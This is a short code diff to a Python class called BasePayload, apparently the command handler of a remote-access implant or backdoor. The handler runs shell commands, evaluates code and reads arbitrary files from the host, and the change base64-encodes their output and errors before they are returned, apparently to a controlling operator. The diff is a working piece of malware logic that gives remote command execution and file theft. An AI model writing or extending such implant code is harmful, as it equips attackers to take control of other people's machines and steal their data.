@@ -10,7 +10,7 @@ class BasePayload(object):
 	def do_cmd(self, cmd):
 		res = cmd
 		if cmd['type'] == 'sh':
-			res['res'] = utils.sh(cmd['cmd'])
+			res['res'] = utils.b64e(utils.sh(cmd['cmd']))
 			return res
 		elif cmd['type'] == 'eval':
 			try:
@@ -21,9 +21,9 @@ class BasePayload(object):
 			return res
 		elif cmd['type'] == 'dl':
 			try:
-				fd = open(cmd['fn'],'rb').read()
+				fd = utils.b64e(open(cmd['fn'],'rb').read())
 			except Exception as e:
-				fd = e
+				fd = utils.b64e(e.encode())
 			res['res'] = fd
 			return res
 		elif cmd['type'] == 'ul':
